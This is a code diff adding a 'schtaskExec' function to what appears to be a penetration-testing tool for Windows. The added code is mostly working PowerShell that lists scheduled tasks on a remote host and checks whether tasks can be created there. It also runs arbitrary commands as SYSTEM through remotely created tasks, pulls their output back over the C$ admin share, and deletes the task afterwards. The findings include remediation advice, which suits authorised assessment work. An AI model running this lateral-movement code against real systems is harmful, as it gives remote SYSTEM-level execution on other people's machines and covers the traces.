@@ -1058,6 +1058,150 @@ $conn.Close()
   return { output: output.join("\n"), findings }
 }
 
+export async function schtaskExec(args: string[], timeout: number): Promise<HookResult> {
+  const target = argVal(args, "--target")
+  const command = argVal(args, "--command")
+  const user = argVal(args, "--user")
+  const password = argVal(args, "--password")
+  const taskName = argVal(args, "--name") || `CS_${Date.now().toString(36)}`
+  const action = argVal(args, "--action") || (command ? "exec" : "enum")
+  const findings: Finding[] = []
+  const output: string[] = [`[*] Remote scheduled task execution — ${action}\n`]
+
+  if (action === "enum") {
+    if (!target) {
+      output.push("[!] --target required for enum action")
+      return { output: output.join("\n"), findings }
+    }
+    const cred = user && password ? `/RU "${user}" /RP "${password}"` : ""
+    const script = `
+Write-Output "=== Remote Scheduled Tasks on ${target} ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+Write-Output "[*] Enumerating tasks on ${target}..."
+$result = schtasks.exe /Query /S "${target}" ${cred} /FO CSV /NH 2>&1
+if ($LASTEXITCODE -ne 0) {
+    Write-Output "[-] Cannot query tasks: $result"
+    Write-Output "[*] Check credentials and network access"
+    exit 1
+}
+
+$tasks = $result | ConvertFrom-Csv -Header TaskName,NextRun,Status
+$running = $tasks | Where-Object { $_.Status -eq 'Running' }
+$systemTasks = $tasks | Where-Object { $_.TaskName -match '\\\\Microsoft\\\\' }
+$customTasks = $tasks | Where-Object { $_.TaskName -notmatch '\\\\Microsoft\\\\' -and $_.TaskName -ne 'TaskName' }
+
+Write-Output "[*] Total tasks: $($tasks.Count)"
+Write-Output "[*] Running: $($running.Count)"
+Write-Output "[*] Custom (non-Microsoft): $($customTasks.Count)"
+Write-Output ""
+
+if ($customTasks) {
+    Write-Output "[!] Custom tasks (potential persistence or targets):"
+    foreach ($t in ($customTasks | Select-Object -First 20)) {
+        Write-Output "    $($t.TaskName)  Status: $($t.Status)"
+    }
+}
+
+Write-Output ""
+Write-Output "[*] Testing task creation permission..."
+$testResult = schtasks.exe /Create /S "${target}" ${cred} /TN "CS_PermTest" /TR "cmd /c echo test" /SC ONCE /ST 23:59 /F 2>&1
+if ($LASTEXITCODE -eq 0) {
+    Write-Output "[+] Task creation ALLOWED — lateral movement possible"
+    schtasks.exe /Delete /S "${target}" ${cred} /TN "CS_PermTest" /F 2>$null
+} else {
+    Write-Output "[-] Task creation denied: $testResult"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-LAT-012",
+      provider: "windows",
+      severity: r.stdout.includes("ALLOWED") ? "high" : "info",
+      status: "ENUMERATED",
+      resource: `schtask://${target}`,
+      title: `Remote scheduled task enumeration on ${target}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Restrict remote task scheduler access. Monitor Event ID 4698 (task creation) on remote hosts.",
+    })
+  }
+
+  if (action === "exec") {
+    if (!target || !command) {
+      output.push("[!] --target and --command required for exec action")
+      return { output: output.join("\n"), findings }
+    }
+    const cred = user && password ? `/RU "${user}" /RP "${password}"` : ""
+    const script = `
+Write-Output "=== Remote Scheduled Task Execution ==="
+Write-Output "[*] Target: ${target}"
+Write-Output "[*] Task: ${taskName}"
+Write-Output "[*] Command: ${command}"
+Write-Output ""
+
+$outFile = "C:\\Windows\\Temp\\${taskName}.out"
+$wrappedCmd = "cmd.exe /c ${command.replace(/"/g, '\\"')} > $outFile 2>&1"
+
+Write-Output "[*] Step 1: Creating remote task..."
+$create = schtasks.exe /Create /S "${target}" ${cred} /TN "${taskName}" /TR "$wrappedCmd" /SC ONCE /ST 00:00 /RU SYSTEM /F 2>&1
+if ($LASTEXITCODE -ne 0) {
+    Write-Output "[-] Task creation failed: $create"
+    exit 1
+}
+Write-Output "[+] Task created: ${taskName}"
+
+Write-Output "[*] Step 2: Running task..."
+$run = schtasks.exe /Run /S "${target}" ${cred} /TN "${taskName}" 2>&1
+if ($LASTEXITCODE -ne 0) {
+    Write-Output "[-] Task execution failed: $run"
+    schtasks.exe /Delete /S "${target}" ${cred} /TN "${taskName}" /F 2>$null
+    exit 1
+}
+Write-Output "[+] Task started"
+
+Write-Output "[*] Step 3: Waiting for completion..."
+$maxWait = 30
+for ($i = 0; $i -lt $maxWait; $i++) {
+    Start-Sleep -Seconds 1
+    $status = schtasks.exe /Query /S "${target}" ${cred} /TN "${taskName}" /FO CSV /NH 2>&1
+    if ($status -match 'Ready') { break }
+}
+
+Write-Output "[*] Step 4: Retrieving output..."
+$uncPath = "\\\\${target}\\C$\\Windows\\Temp\\${taskName}.out"
+if (Test-Path $uncPath) {
+    $taskOutput = Get-Content $uncPath -Raw
+    Write-Output "[+] Command output:"
+    Write-Output $taskOutput
+    Remove-Item $uncPath -Force -ErrorAction SilentlyContinue
+} else {
+    Write-Output "[*] Output file not accessible via UNC — try: type \\\\${target}\\C$\\Windows\\Temp\\${taskName}.out"
+}
+
+Write-Output "[*] Step 5: Cleanup..."
+schtasks.exe /Delete /S "${target}" ${cred} /TN "${taskName}" /F 2>$null
+Write-Output "[+] Task deleted"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-LAT-013",
+      provider: "windows",
+      severity: "critical",
+      status: r.stdout.includes("Task started") ? "EXECUTED" : "FAILED",
+      resource: `schtask://${target}/${taskName}`,
+      title: `Remote command execution via scheduled task on ${target}`,
+      details: `Command: ${command}`,
+      remediation: "Restrict remote task scheduler. Monitor Event ID 4698/4702. Disable remote task creation for non-admin users.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 export async function sshExec(args: string[], timeout: number): Promise<HookResult> {
   const target = argVal(args, "--target")
   const command = argVal(args, "--command")
